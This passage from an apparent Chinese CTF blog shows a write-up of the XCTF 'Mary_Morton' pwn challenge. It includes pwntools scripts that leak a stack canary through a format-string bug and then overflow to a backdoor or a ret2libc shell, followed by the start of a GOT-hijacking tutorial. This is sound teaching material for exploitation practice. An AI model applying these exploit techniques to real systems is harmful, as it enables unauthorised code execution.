class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token function">sub_4008EB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    #格式化字符串漏洞    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token number">3</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Bye "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>      <span class="token function">sub_400960</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>           #存在溢出    <span class="token keyword">else</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span>后门：<span class="token keyword">int</span> <span class="token function">sub_4008DA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat ./flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>如果没有后门这个题会让我呛得慌</code></pre><h3 id="函数sub-4008EB-："><a href="#函数sub-4008EB-：" class="headerlink" title="函数sub_4008EB()："></a>函数sub_4008EB()：</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">sub_4008EB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-90h]     #别误以为buf是大小为90h的数组，擦亮眼睛</span>  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+88h] [rbp-8h]</span>  v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">40u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">128uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">127uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">40u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v2<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>read函数只能读入127个字符，无法溢出，显然只能利用下面的格式化字符串漏洞。<br>printf因为RELRO关闭可改写got表，以及其他数据，泄露地址那是基本能力。</p><h3 id="函数sub-400960："><a href="#函数sub-400960：" class="headerlink" title="函数sub_400960："></a>函数sub_400960：</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">sub_400960</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-90h]</span>  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+88h] [rbp-8h]</span>  v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">40u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">128uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">256uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-> %s\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">40u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v2<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这里read可以往buf地址处读入256个字符，而buf离RBP距离为90h所以存在溢出。但别忘了canary开启。<br>canary一般就在RBP上面，如果不记得了可以看汇编代码：</p><pre class=" language-bash"><code class="language-bash">buf<span class="token operator">=</span> byte ptr -90hvar_8<span class="token operator">=</span> qword ptr -8<span class="token punctuation">;</span> __unwind <span class="token punctuation">{</span>push    rbpmov     rbp, rspsub     rsp, 90hmov     rax, fs:28hmov     <span class="token punctuation">[</span>rbp+var_8<span class="token punctuation">]</span>, rax        <span class="token comment" spellcheck="true">#[rbp+var_8]就是rbp-8即rbp上面一个栈帧</span>xor     eax, eaxlea     rdx, <span class="token punctuation">[</span>rbp+buf<span class="token punctuation">]</span></code></pre><h2 id="3：思路"><a href="#3：思路" class="headerlink" title="3：思路"></a>3：思路</h2><h3 id="综上"><a href="#综上" class="headerlink" title="综上"></a>综上</h3><ul><li>canary，NX开启</li><li>整个程序存在格式化字符串漏洞和溢出漏洞</li><li>存在后门</li><li>所以利用格式化字符串漏洞泄露canary，每个char buf都会被插入cookie</li><li>padding+cookie绕过canary，控制程序流程</li></ul><h3 id="格式化字符串漏洞泄露偏移量"><a href="#格式化字符串漏洞泄露偏移量" class="headerlink" title="格式化字符串漏洞泄露偏移量"></a>格式化字符串漏洞泄露偏移量</h3><pre><code>Welcome to the battle ! [Great Fairy] level pwned Select your weapon 1. Stack Bufferoverflow Bug 2. Format String Bug 3. Exit the battle 2AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%pAAAAAAAA0x7ffc11daed70.0x7f.0x7f82284ed081.(nil).(nil).0x4141414141414141.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e701. Stack Bufferoverflow Bug 2. Format String Bug 3. Exit the battle 闹钟64位就用8个A好看一点，偏移量是6这作者还设了一个闹钟，很烦~~~</code></pre><p>我们来看看sub_4008EB（字符串漏洞）函数的栈分布：<br><img src="https://s1.ax1x.com/2020/07/18/U2sMeU.png" alt=""><br>那么可以很容易算出cookie的偏移位置：(0x90-0x8)/8 + 6 ==&gt;23.</p><p>来试一试：</p><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/XCTF/xctf_challenge$ ./Mary_Morton Welcome to the battle <span class="token operator">!</span> <span class="token punctuation">[</span>Great Fairy<span class="token punctuation">]</span> level pwned Select your weapon 1. Stack Bufferoverflow Bug 2. Format String Bug 3. Exit the battle 2%23<span class="token variable">$pAAA</span>0xceb50cabb0ce3f00AAA                <span class="token comment" spellcheck="true">#千万记住你后面AAA会接在你泄露地址后面，别把他们当作泄露的一部分了</span>1. Stack Bufferoverflow Bug          <span class="token comment" spellcheck="true">#没错这个离谱的数就是cookie了，有离谱和末尾的00作证</span>2. Format String Bug 3. Exit the battle 闹钟</code></pre><p><strong>泄露成功！什么你说我泄露 sub_4008EB里面的cookie关sub_400960的cookie什么事？我说他们是周树人和鲁迅关系你信吗，反正我信了。</strong></p><p>之后我们进入栈溢出函数构造payload即可实现跳转到后门。</p><h3 id="溢出点计算"><a href="#溢出点计算" class="headerlink" title="溢出点计算"></a>溢出点计算</h3><p>之前我以为有canary，溢出点就很难用gdb测出来了。其实并没有，我们来看看溢出函数栈是啥情况：<br>函数开始的部分汇编代码：</p><pre><code>push    rbpmov     rbp, rspsub     rsp, 90hmov     rax, fs:28hmov     [rbp+var_8], raxxor     eax, eaxlea     rdx, [rbp+buf]</code></pre><p>一般程序栈的返回地址，RBP/EBP会在最前面就布置好，就像上面那样，显然是一般函数的栈分布：<br><img src="https://s1.ax1x.com/2020/07/18/U2suLT.png" alt=""><br>那么payload：’A’*(0x90-8) + p64(cookie) + ‘AAAAAAAA’ + p64(backdoor)</p><h2 id="4-EXP"><a href="#4-EXP" class="headerlink" title="4:EXP"></a>4:EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./Mary_Morton'</span><span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">'%23$pAAA'</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>cookie <span class="token operator">=</span> int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'00'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span> cookiesh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>backdoor <span class="token operator">=</span> <span class="token number">0x04008DA</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'AAAAAAAA'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="5-EXP无后门版"><a href="#5-EXP无后门版" class="headerlink" title="5:EXP无后门版"></a>5:EXP无后门版</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'Mary_Morton'</span><span class="token punctuation">)</span>system_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>bss_addr <span class="token operator">=</span> <span class="token number">0x0601080</span>door <span class="token operator">=</span> <span class="token number">0x004008DA</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0400ab3</span><span class="token comment" spellcheck="true">#main : 0x0400826</span><span class="token comment" spellcheck="true">#RDI, RSI, RDX, RCX, R8 R9</span><span class="token comment" spellcheck="true">#0x0000000000400659 : ret</span><span class="token comment" spellcheck="true">#0x0400B2B cat</span><span class="token comment" spellcheck="true">#0400ab3 : pop rdi ; ret</span><span class="token comment" spellcheck="true">#0400960 overflow</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./Mary_Morton'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sh = remote('220.249.52.133',40551)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"#############leaking the cookie#################"</span>payload <span class="token operator">=</span> <span class="token string">'%23$pAAA'</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>cookie <span class="token operator">=</span> int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> cookie<span class="token keyword">print</span> <span class="token string">"#############leaking the puts_addr#################"</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">136</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'AAAAAAAA'</span> payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000400659</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#payload += p64(pop_rdi_ret) + p64(0x0400B2B) + p64(system_plt)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0000000000400659</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0400826</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>tmp <span class="token operator">=</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x00'</span> <span class="token operator">+</span> <span class="token string">'\x00'</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"puts_addr==>"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"libc_addr==>"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>binsh_addr <span class="token operator">=</span> libc_addr<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"#############final attack#################"</span>payload2 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">136</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'AAAAAAAA'</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000400659</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>结果：Welcome to the battle ! <span class="token punctuation">[</span>Great Fairy<span class="token punctuation">]</span> level pwned Select your weapon <span class="token number">1</span><span class="token punctuation">.</span> Stack Bufferoverflow Bug <span class="token number">2</span><span class="token punctuation">.</span> Format String Bug <span class="token number">3</span><span class="token punctuation">.</span> Exit the battle <span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x2</span> bytes<span class="token punctuation">:</span>    <span class="token string">'1\n'</span><span class="token comment" spellcheck="true">#############final attack#################</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0xb9</span> bytes<span class="token punctuation">:</span>    <span class="token number">00000000</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  │AAAA│AAAA│AAAA│AAAA│    <span class="token operator">*</span>    <span class="token number">00000080</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">00</span> d0 eb ef  e0 eb d0 <span class="token number">4c</span>  │AAAA│AAAA│····│···L│    <span class="token number">00000090</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">59</span> <span class="token number">06</span> <span class="token number">40</span> <span class="token number">00</span>  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  │AAAA│AAAA│Y·@·│····│    <span class="token number">000000a0</span>  b3 <span class="token number">0a</span> <span class="token number">40</span> <span class="token number">00</span>  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  <span class="token number">9a</span> <span class="token number">4e</span> <span class="token number">3a</span> <span class="token number">79</span>  <span class="token number">16</span> <span class="token number">7f</span> <span class="token number">00</span> <span class="token number">00</span>  │··@·│····│·N<span class="token punctuation">:</span>y│····│    <span class="token number">000000b0</span>  <span class="token number">40</span> <span class="token number">04</span> <span class="token number">24</span> <span class="token number">79</span>  <span class="token number">16</span> <span class="token number">7f</span> <span class="token number">00</span> <span class="token number">00</span>  <span class="token number">0a</span>                        │@·$y│····│·│    <span class="token number">000000b9</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x8c</span> bytes<span class="token punctuation">:</span>    <span class="token string">'-> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'</span><span class="token operator">-</span><span class="token operator">></span> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$ whoami<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x7</span> bytes<span class="token punctuation">:</span>    <span class="token string">'whoami\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x7</span> bytes<span class="token punctuation">:</span>    <span class="token string">'hunter\n'</span>hunter<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive$  </code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-challenge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wiki-hijack GOT</title>
      <link href="/2020/07/17/wiki-hijack-got/"/>
      <url>/2020/07/17/wiki-hijack-got/</url>
      
        <content type="html"><![CDATA[<h2 id="1：原理"><a href="#1：原理" class="headerlink" title="1：原理"></a>1：原理</h2><p>在目前的 C 程序中，libc 中的函数都是通过 GOT 表来跳转的。此外，<strong>在没有开启 RELRO（即 partial RELRO）前提下，每个 libc 的函数对应的 GOT 表项是可以被修改的</strong>。因此，我们可以修改某个 libc 函数的 GOT 表内容为另一个 libc 函数的地址来实现对程序的控制。比如说我们可以修改 printf 的 got 表项内容为 system 函数的地址。从而，程序在执行 printf 的时候实际执行的是 system 函数。</p><p>假设我们将函数 A 的地址覆盖为函数 B 的地址，那么这一攻击技巧可以分为以下步骤：</p><ul><li><p><strong>确定函数 A 的 GOT 表地址</strong><br>   这一步我们利用的函数 A 一般在程序中已有，所以可以采用简单的寻找地址的方法来找。IDA或是ELF等</p></li><li><p><strong>确定函数 B 的内存地址</strong><br>   这一步通常来说，需要我们自己想办法来泄露对应函数 B 的地址。</p></li><li><p><strong>将函数 B 的内存地址写入到函数 A 的 GOT 表地址处</strong></p></li></ul><p>这一步一般来说需要我们利用函数的漏洞来进行触发。一般利用方法有如下3种</p><blockquote><p>写入函数：write 函数。</p></blockquote><blockquote><p>ROP:<br>pop eax; ret;           # printf@got -&gt; eax<br>pop ebx; ret;           # (addr_offset = system_addr - printf_addr) -&gt; ebx 函数间的偏移量<br>add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset</p></blockquote><blockquote><p>格式化字符串任意地址写</p></blockquote><h2 id="2：例子2016-CCTF-–-pwn3"><a href="#2：例子2016-CCTF-–-pwn3" class="headerlink" title="2：例子2016 CCTF – pwn3"></a>2：例子2016 CCTF – pwn3</h2><h3 id="checksec："><a href="#checksec：" class="headerlink" title="checksec："></a>checksec：</h3><pre class=" language-c"><code class="language-c">hunter@hunter<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>wiki<span class="token operator">/</span>formal$ checksec pwn3<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/wiki/formal/pwn3'</span>    Arch<span class="token punctuation">:</span>     i386<span class="token number">-32</span><span class="token operator">-</span>little    RELRO<span class="token punctuation">:</span>    Partial RELRO    Stack<span class="token punctuation">:</span>    No canary found    NX<span class="token punctuation">:</span>       NX enabled           #只开了NX    PIE<span class="token punctuation">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x8048000</span><span class="token punctuation">)</span></code></pre><h3 id="IDA："><a href="#IDA：" class="headerlink" title="IDA："></a>IDA：</h3><p><img src="https://s1.ax1x.com/2020/07/17/U6yi26.png" alt=""><br>ask_username(&amp;s1)和ask_password(&amp;s1)函数可以很容易得出：要输入rxraclhm。<br>get_command()函数，就是输入get，put，dir然后会进入下面相应的函数，如果输入其他的直接退出程序<br>接下来隆重介绍以下函数：<br><strong>put_file（）函数</strong></p><pre class=" language-c"><code class="language-c">_DWORD <span class="token operator">*</span><span class="token function">put_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  _DWORD <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST1C_4     #v0是一个指针，其大小为DWORD4个字节</span>  _DWORD <span class="token operator">*</span>result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  v0 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">244u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     #malloc函数开辟一个大小为<span class="token number">244</span>的堆区  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"please enter the name of the file you want to upload:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">get_input</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v0<span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    #get_input函数别有乾坤  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"then, enter the content:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">get_input</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v0 <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v0<span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span> <span class="token operator">=</span> file_head<span class="token punctuation">;</span>        #file_head是一个全局变量<span class="token punctuation">,</span> BSS段  result <span class="token operator">=</span> v0<span class="token punctuation">;</span>  file_head <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v0<span class="token punctuation">;</span>     #最后堆区的地址给到了file_head Bss段全局变量  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span>get_input函数    将堆区的地址v0传入即a1<span class="token comment" spellcheck="true">// a1是地址  a2是大小  a3是1</span><span class="token keyword">signed</span> <span class="token keyword">int</span> __cdecl <span class="token function">get_input</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  _BYTE <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+18h] [ebp-10h]</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-Ch]</span>  v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v4 <span class="token operator">=</span> <span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v5 <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>           result <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v5 <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1u</span><span class="token punctuation">,</span> <span class="token number">1u</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   #往a1里面读入字符，一次读一个whle循环    <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>v4 <span class="token operator">==</span> <span class="token number">10</span> <span class="token operator">&amp;&amp;</span> a3 <span class="token punctuation">)</span>   <span class="token operator">*</span>v4应该不会等于<span class="token number">10</span>，所以我觉都这个<span class="token keyword">if</span>语句完全不会执行，直接执行<span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token 